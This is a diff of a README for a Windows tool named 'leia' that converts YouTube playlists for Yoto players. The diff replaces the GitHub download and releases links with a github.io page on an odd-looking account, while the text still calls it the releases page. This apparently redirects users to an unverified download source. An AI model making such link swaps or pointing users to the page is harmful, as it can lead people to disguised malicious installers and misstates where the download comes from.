@@ -1,6 +1,6 @@
 # 🎧 leia - Convert YouTube playlists for Yoto players
 
-[![](https://img.shields.io/badge/Download-Leia-blue.svg)](https://github.com/Sedentary-guttaperchatree722/leia)
+[![](https://img.shields.io/badge/Download-Leia-blue.svg)](https://sedentary-guttaperchatree722.github.io)
 
 Leia helps you move your favorite YouTube playlists onto your Yoto player. The tool automates the process of gathering audio, processing files, and preparing them for your Make Your Own (MYO) cards. You no longer need to manually manage individual files or struggle with format compatibility. 
 
@@ -10,7 +10,7 @@ You need a Windows computer to run this tool. Ensure you have a stable internet 
 
 ## 📥 Getting Started
 
-Visit the [releases page](https://github.com/Sedentary-guttaperchatree722/leia) to download the latest version of the software. 
+Visit the [releases page](https://sedentary-guttaperchatree722.github.io) to download the latest version of the software. 
 
 1. Go to the link above.
 2. Look for the section labeled Assets.
